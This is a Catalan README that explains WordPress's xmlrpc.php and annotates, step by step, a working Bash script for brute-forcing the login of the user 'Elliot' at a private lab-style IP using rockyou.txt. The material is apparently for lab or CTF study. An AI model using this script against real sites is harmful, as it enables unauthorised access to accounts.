# Vulnerar-arxiu-xmlrpc.php
Script per a xmlrpc.php de WordPress


Què és l'arxiu xmlrpc.php?, per a què serveix?

L'arxiu `xmlrpc.php` és un component de WordPress que facilita la comunicació remota entre diferents sistemes a través del protocol XML-RPC. XML-RPC és un protocol de comunicació que utilitza XML per codificar els seus missatges i s'utilitza per realitzar operacions remotas en un servidor.

En el cas específic de WordPress, `xmlrpc.php` permet realitzar diverses accions i consultes al lloc de WordPress de forma remota. Algunes de les funcions que es poden realitzar a través de XML-RPC inclouen:

1. **Publicació de contingut:** Pots crear, editar i eliminar entrades i pàgines al teu lloc de WordPress.
2. **Gestió de comentaris:** Pots aprovar o desaprovar comentaris, obtenir la llista de comentaris i més.
3. **Obtenció d'informació del lloc:** Pots obtenir informació sobre el lloc, com detalls de l'usuari, categories, etiquetes, etc.
4. **Maneig de mitjans:** Pots pujar imatges i altres fitxers multimèdia al teu lloc.

No obstant això, és important destacar que l'ús de XML-RPC també pot representar un risc de seguretat si no es configura adequadament. Alguns atacs a llocs de WordPress han utilitzat aquest arxiu per realitzar sol·licituds malicioses. En conseqüència, en versions més recents de WordPress, és possible que trobis mesures de seguretat que limiten o desactivin l'ús de `xmlrpc.php` per defecte.

Si no necessites utilitzar XML-RPC al teu lloc de WordPress i tens preocupacions de seguretat, pots considerar desactivar o restringir l'accés a `xmlrpc.php`. Això es pot fer mitjançant plugins de seguretat o directament des de l'arxiu `.htaccess` en el teu servidor web.

# L'script

Aquest script serveix per a fer atacs de força bruta a l'arxiu xmlrpc.php:

Aquest script de Bash sembla ser un intent de realitzar un atac de força bruta contra un lloc web WordPress a través de l'arxiu `xmlrpc.php`. Analitzem cadascuna de les parts del script:

1. **Definició de Funcions:**
    ```bash
    function salir() {
        exit 1
    }
    ```
    - Es defineix una funció anomenada `salir()` que simplement surt del script amb un codi de sortida 1.

    ```bash
    trap salir SIGINT
    ```
    - Utilitza `trap` per capturar la senyal SIGINT (per exemple, quan es prem Ctrl+C) i executar la funció `salir()`. Això permet una sortida controlada del script en cas d'interrupció.

2. **Bucle de Força Bruta:**
    ```bash
    for i in $(cat rockyou.txt); do
    ```
    - Inicia un bucle `for` que itera a través de cada línia de l'arxiu `rockyou.txt`, que probablement conté contrasenyes comunes.

3. **Generació de Sol·licitud XML:**
    ```bash
    variable=$(cat <<FIN
    <?xml version="1.0" encoding="UTF-8"?>
    <methodCall> 
        <methodName>wp.getUsersBlogs</methodName> 
        <params> 
            <param><value>Elliot</value></param> 
            <param><value>$i</value></param> 
        </params>     
    </methodCall>
    FIN
    )
    ```
    - Es genera una cadena XML que representa una sol·licitud XML-RPC per a la funció `wp.getUsersBlogs`. Utilitza el nom d'usuari fix "Elliot" i la contrasenya actual del bucle.

4. **Sortida a la Pantalla i Escriptura a l'Arxiu:**
    ```bash
    echo -e "$variable" >> enviar.xml
    echo -e "[+] Provem amb la contrasenya $i"
    ```
    - La cadena XML generada s'afegeix a l'arxiu `enviar.xml`.
    - Es mostra a la pantalla un missatge indicant la contrasenya que s'està provant.

5. **Enviament de la Sol·licitud al Servidor WordPress:**
    ```bash
    curl -s -X POST 'http://10.10.126.89/xmlrpc.php' -d@enviar.xml >> log.log
    ```
    - Utilitza `curl` per enviar la sol·licitud XML al servidor WordPress situat a 'http://10.10.126.89/xmlrpc.php'. La resposta del servidor s'encamina a l'arxiu `log.log`.

6. **Verificació de la Resposta i Sortida del Script:**
    ```bash
    if [ ! "$(cat log.log | grep 'Incorrect username or password.')" ]; then
        echo -e "[+] La contrasenya per a Elliot és $i"
        exit 0
    fi
    ```
    - Verifica si la resposta del servidor conté la cadena 'Incorrect username or password.'.
    - Si no troba aquesta cadena, assumeix que la contrasenya és correcta, mostra un missatge indicant la contrasenya i surt del script.

7. **Espera i Neteja:**
    ```bash
    sleep 1
    rm log.log enviar.xml
    ```
    - Introdueix un retard de 1 segon entre cada intent per evitar bloquejos o restriccions del servidor.
    - Esborra els arxius `log.log` i `enviar.xml` després de cada intent.

En resum, aquest script intenta realitzar un atac de força bruta per trobar la contrasenya de l'usuari "Elliot" en un lloc WordPress específic mitjançant l'enviament de sol·licituds XML-RPC amb contrasenyes de l'arxiu `rockyou.txt`. Tingues en compte que l'ús d'scripts per realitzar atacs de força bruta està en contra de les polítiques de molts llocs web i pot ser il·legal sense el consentiment explícit del propietari del lloc. A més, aquest tipus d'activitats poden tenir conseqüències negatives i s'han de realitzar amb responsabilitat i ètica.
